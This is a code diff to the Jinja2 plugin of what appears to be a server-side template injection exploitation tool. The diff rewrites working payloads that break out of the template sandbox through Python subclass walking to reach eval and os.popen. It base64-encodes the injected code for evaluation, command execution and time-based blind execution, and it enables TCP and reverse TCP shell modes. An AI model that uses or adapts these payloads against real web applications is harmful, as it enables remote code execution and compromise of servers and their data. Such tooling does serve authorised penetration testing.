@@ -29,7 +29,7 @@ class Jinja2(Plugin):
         },
         'evaluate' : {
             'call': 'render',
-            'evaluate': """{%% set d = "%(code)s" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
+            'evaluate': """{%% set d = "eval(__import__('base64').urlsafe_b64decode('%(code_b64)s'))" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
     {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
     {%% if 'eval' in b.keys() %%}
     {{ b['eval'](d) }}
@@ -38,7 +38,7 @@ class Jinja2(Plugin):
         },
         'execute' : {
             'call': 'evaluate',
-            'execute': """__import__('os').popen('%(code)s').read()"""
+            'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
         },
         'blind' : {
             'call': 'evaluate_blind',
@@ -47,7 +47,7 @@ class Jinja2(Plugin):
         },
         'evaluate_blind' : {
             'call': 'evaluate',
-            'evaluate_blind': """%(code)s and __import__('time').sleep(%(delay)i)"""
+            'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s')) and __import__('time').sleep(%(delay)i)"""
         },
         'tcp_shell' : {
             'call' : 'execute_blind',
@@ -59,14 +59,13 @@ class Jinja2(Plugin):
         },
         'execute_blind' : {
             'call': 'inject',
-            'execute_blind': """{%% set d = "__import__('os').popen('%(code)s && sleep %(delay)i').read()" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
+            'execute_blind': """{%% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s') + ' && sleep %(delay)i').read()" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
     {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
     {%% if 'eval' in b.keys() %%}
     {{ b['eval'](d) }}
     {%% endif %%} {%% endif %%} {%% endfor %%}
     {%% endif %%} {%% endfor %%}"""
         },
-
     }
 
     contexts = [
@@ -132,7 +131,3 @@ class Jinja2(Plugin):
             self.set('execute_blind', True)
             self.set('tcp_shell', True)
             self.set('reverse_tcp_shell', True)
-
-    def evaluate(self, code, **kwargs):
-        # Quote code before submitting it
-        return super(Jinja2, self).evaluate(quote(code), **kwargs)
